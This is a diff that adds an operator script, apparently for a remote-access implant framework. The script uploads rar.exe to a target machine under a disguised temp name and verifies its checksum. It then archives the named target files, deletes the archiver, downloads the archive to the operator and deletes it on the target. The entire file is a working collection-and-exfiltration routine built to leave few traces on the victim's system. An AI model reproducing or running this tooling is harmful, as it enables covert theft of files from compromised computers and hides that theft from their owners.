@@ -1,0 +1,262 @@
+#-------------------------------------------------------------------------------
+# File: rarget.eps
+# Description: Puts up rar.exe as a different name, rars up target files as a temp name,
+#    deletes rar.exe, then brings them back
+#
+#-------------------------------------------------------------------------------
+
+string $filesToGet;
+string $temppath;
+string $rarFile;
+string $archive;
+bool $badParams = false;
+
+if ($argc < 5) {
+    $badParams = true;
+} else {
+	if ($argv[1] == "?") {
+		$badParams=true;
+	}
+	if ($argv[4] == "?") {
+		$badParams=true;
+	}
+
+	$temppath=$argv[1];
+	$rarFile=$argv[2];
+	$archive=$argv[3];
+
+	if ($temppath == "auto") {
+		### Get temp path
+		@echo off;
+		@record on;
+		ifnot(`lpgetenv -option temppath`) {
+			`script temppath.eps`;
+			ifnot (`lpgetenv -option temppath`) {
+				echo "Could not get temp path.";
+				$badParams=true;
+			} else {
+				$temppath=GetCmdData("value");
+			}
+		} else {
+			$temppath=GetCmdData("value");
+		}
+		@echo on;
+		@record off;
+	}
+	if ($rarFile == "auto") {
+		$rarFile="~rn.ex_";
+	}
+	if ($archive == "auto") {
+		$archive="~ae3.tmp";
+	}
+}
+
+if ($badParams) {
+    echo "Usage: $argv[0] <temp path> <temp name for rar.exe> <temp name for rarred archive> <files to get>";
+    echo "OR Usage: rarget <file to get>";
+    echo "  (rarget is aliased to $argv[0] auto auto auto, so you just type the file(s) to get)";
+    echo "Files should be either relative or full path names; do *NOT* use the -path option.";
+    echo "You will need to put quotes around any files with spaces in their name or path.";
+    echo "";
+    echo "What it does:";
+    echo "    Does a rar/get, putting up rar.exe as <temp path>\\<temp name>";
+    echo "    Then rars each file into <temp name for rarred archive>";
+    echo "    Deletes rar.exe";
+    echo "    Brings back the rarred file, then deletes it.";
+    echo "    ";
+    echo "    Using 'auto' for temp path, temp name for rar.exe, or temp name for rarred archive";
+    echo "      results in the script attempting to automatically find good values for them";
+
+    if ($argc > 1) {
+	if ($argv[1] == "?") {
+	    return true;
+	}
+    }
+
+    return false;
+}
+
+######## Put up rar
+
+# TODO: Check for existing winRAR installation (C:\program files\winrar\rar.exe), checksum, use if it exists
+
+echo "Putting up rar as $temppath\\$rarFile.";
+
+@echo off;
+@record on;
+string $ScriptsDir;
+if(`getdirectory -scripts`) {
+  string $Dir = GetCmdData("dir");
+	$ScriptsDir = $Dir[0];
+}else{
+	$ScriptsDir = "E:\\resources\\ep\\scripts";
+}
+@record off;
+@echo on;
+
+ifnot (`dir "$rarFile" -path "$temppath"`) {
+	ifnot (`put "$ScriptsDir\\..\\..\\..\\Tools\\rar.exe" -name "$temppath\\$rarFile"`) {
+		echo "!!! Couldn't put rar.exe up in $temppath !!!";
+		return false;
+	} else {
+		if (`script checksum.eps rar.exe "$ScriptsDir\\..\\..\\..\\Tools" "$rarFile" "$temppath"`) {
+			echo "Successful put of rar.exe as $temppath\\$rarFile";
+		} else {
+			echo "Checksum of remote file does not match!!  Bailing!!!";
+			echo "Delete the corrupted version if you just put it up.  Don't delete if it actually already existed.";
+			echo "(It probably was just corrupted somehow on the way up)";
+			if (prompt "Delete the remote (corrupted) version of rar?") {
+				ifnot (`del "$rarFile" -path "$temppath"`) {
+					echo "!!! Failed to del $rarFile!";
+					pause;
+				}
+			}
+			return false;
+		}
+	}
+} else {
+	echo "!!! $rarFile already exists in $temppath, use a different name !!!";
+	return false;
+}
+echo "REMEMBER!  If you quit before the script finishes, make sure to del \"$rarFile\" -path \"$temppath\"";
+
+string $files;
+int $i=0;
+int $filenum=4;
+while ($filenum < $argc) {
+	$files[$i]=$argv[$filenum];
+	$i++;
+	$filenum++;
+}
+
+int $tempnum=0;
+string $tempfile;
+
+$i=0;
+bool $success=false;
+bool $added;
+
+string $curpath="";
+# get current working directory
+@record on;
+ifnot (`pwd`) {
+	echo "Could not get current path using pwd.  Continuing, but the path may not be correctly recorded.";
+} else {
+	$curpath=GetCmdData("string_val");
+}
+@record off;
+
+string $fileParts;
+string $path;
+string $fileMask;
+string $args="";
+
+int $numFilesInRar=0;
+
+while ($i < sizeof($files)) {
+	# TODO: split path of $files[$i] and wrap this in an "if (dir)" to make sure the file exists
+
+	string $fileParts=splitpath($files[$i]);
+	$path=$fileParts[0];
+	$fileMask=$fileParts[1];
+#		if ($fileParts[0] != "") {
+#			#TODO: see if this is a relative path; if relative, add current dir
+#			@record on;
+#			`pwd`;
+#			$localDir=GetCmdData("string_val");
+#			@record off;
+#		}
+
+	$args="";
+	if ($path != "") {
+		$args = " -path \"$path\"";
+	}
+
+	if (`dir "$fileMask"$args`) {
+		ifnot(`run -command "\\"$temppath\\$rarFile\\" a \\"$temppath\\$archive\\" \\"$files[$i]\\"" -redirect rar`) {
+			echo "Could not run rar.";
+			echo "Failed RarAdd (currently in \"$curpath\"): \"$files[$i]\" => \"$temppath\\$archive\")";
+			$added[$i]=false;
+			echo "(If you quit here, make sure to del \"$rarFile\" -path \"$temppath\")";
+			pause;
+		} else {
+			$added[$i]=true;
+			$numFilesInRar++;
+#			echo "Wait until the command has finished running, then continue.";
+#			echo "(If you quit here, make sure to del \"$rarFile\" -path \"$temppath\")";
+#			pause;
+			echo "Attempted RarAdd (currently in \"$curpath\"): \"$files[$i]\" => \"$temppath\\$archive\")";
+		}
+	} else {
+		echo "File does not exist.";
+		echo "Failed RarAdd (currently in \"$curpath\"): \"$files[$i]\" => \"$temppath\\$archive\")";
+	}
+	$i++;
+}
+
+ifnot (`del "$rarFile" -path "$temppath"`) {
+	echo "!!! Failed to del $rarFile!";
+	pause;
+}
+
+
+bool $getFile=false;
+
+if ($numFilesInRar > 0) {
+	$getFile=true;
+}
+
+if ($getFile) {
+	int $filesize;
+	@record on;
+	ifnot (`dir "$archive" -path "$temppath"`) {
+		echo "!!! Couldn't find $archive in $temppath!!!";
+		$getFile=false;
+	} else {
+	 	$filesize=GetCmdData("lowsize");
+		# prompt to continue after displaying size
+		if ($filesize > 1000000) {
+			echo "This is a big rar file ($filesize).";
+			ifnot (prompt "Do you want to bring back this rar file?") {
+				$getFile=false;
+			}
+		}
+	}
+	@record off;
+}
+
+if ($getFile) {
+	# get current working directory
+	@record on;
+	ifnot (`pwd`) {
+		echo "Could not get current path using pwd.  Continuing, but you may end up in the temp directory.";
+	} else {
+		$curpath=GetCmdData("string_val");
+	}
+	@record off;
+	@record on;
+	ifnot (`get "$temppath\\$archive"`) {
+		echo "!!! Failed to get $archive!";
+		pause;
+	} else {
+		string $localname=GetCmdData("LocalName");
+		echo "Successful RarGet (currently in \"$curpath\"): \"$temppath\\$archive\" (local \"$localname\")";
+		$success=true;
+	}
+	@record off;
+} else {
+	$success=false;
+}
+
+ifnot (`del "$archive" -path "$temppath"`) {
+	echo "!!! Failed to del $archive!";
+	if ($getFile) {
+		pause;
+	}
+}
+
+if ($success) {
+	`local run -command "perl E:\\tools\\renameRar.pl" -redirect renamerar`;
+}
+
+return $success;
